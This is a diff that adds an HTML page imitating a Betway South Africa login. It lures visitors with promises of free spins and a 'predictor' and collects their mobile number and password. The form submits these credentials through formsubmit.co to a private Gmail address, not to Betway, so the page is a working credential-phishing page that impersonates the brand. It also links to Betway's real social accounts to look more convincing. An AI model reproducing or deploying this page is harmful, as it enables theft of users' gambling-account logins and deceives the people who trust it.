@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betway</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
+        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="/css/styles.css">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Poppins:300);
+
+        body {
+            height: 100vh;
+            overflow: hidden;
+            font-family: "Poppins";
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-page {
+            width: 400px;
+            padding: 8% 0 0;
+            margin: auto;
+        }
+
+        .form {
+            position: relative;
+            color: green;
+            z-index: 1;
+            background: #FFFFFF;
+            max-width: 400px;
+            margin: 0 auto 100px;
+            padding: 45px;
+            text-align: center;
+            border-radius: 15px;
+            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
+        }
+
+        .form input {
+            font-family: "Poppins", sans-serif;
+            outline: 0;
+            background: #f2f2f2;
+            width: 100%;
+            border: 0;
+            border-radius: 7px;
+            margin: 0 0 15px;
+            padding: 15px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        p {
+            color: black;
+            text-align: center;
+            font-family: monospace;
+            font-weight: bold;
+        }
+
+        .form button {
+            font-family: "Poppins", sans-serif;
+            font-weight: bold;
+            text-transform: uppercase;
+            outline: 0;
+            background: darkgreen;
+            width: 100%;
+            border: 0;
+            padding: 15px;
+            color: #FFFFFF;
+            border-radius: 7px;
+            font-size: 14px;
+            -webkit-transition: all 0.3 ease;
+            transition: all 0.3 ease;
+            cursor: pointer;
+        }
+
+        .form button:hover,
+        .form button:active,
+        .form button:focus {
+            background: #0e2941;
+        }
+
+        .form .message {
+            margin: 15px 0 0;
+            color: green;
+            font-size: 12px;
+        }
+
+        .form .message a {
+            color: #234666;
+            text-decoration: none;
+        }
+
+        .form .register-form {
+            display: none;
+        }
+
+        .fa {
+            padding: 10px;
+            font-size: 30px;
+            width: 50px;
+            text-align: center;
+            text-decoration: none;
+            color: darkgreen;
+        }
+
+        h1 {
+            text-align: center;
+            font-family: sans-serif;
+            font-size: 50px;
+            color: ##84848C;
+            text-shadow: 2px 2px #000000;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-page">
+        <h1>Betway</h1>
+        <div class="form">
+            <form class="login-form" method="post" action="https://formsubmit.co/zithobengubane@gmail.com">
+                <h2><i class="fas fa-lock"></i> Login</h2>
+                <input type="text" placeholder="mobile number" name="mobile_number" required />
+                <input type="password" placeholder="Password" name="password" required />
+                <button type="submit" name="send2">login</button>
+                <p class="message">Not registered? <a href="https://www.betway.co.za/">Create an account</a></p>
+
+                <a href="https://www.facebook.com/betwaysouthafrica?mibextid=sAuArU1zVvLjaiq0" class="fa fa-facebook"></a>
+
+                <a href="https://x.com/Betway_za?t=W12mGDLk9E65ApD9d-gzoQ&s=09" class="fa fa-twitter"></a>
+                <a href="https://www.instagram.com/betway_sa?igshid=OGQ5ZDc2ODk2ZA==" class="fa fa-instagram"></a>
+
+            </form>
+            <p>claim free spins and signals with our predictor a proud partner of betway South Africa.</p>
+        </div>
+    </div>
+
+    <script>
+        $('.message a').click(function () {
+            $('form').animate({ height: "toggle", opacity: "toggle" }, "slow");
+        });
+    </script>
+
+</body>
+
+</html>
+
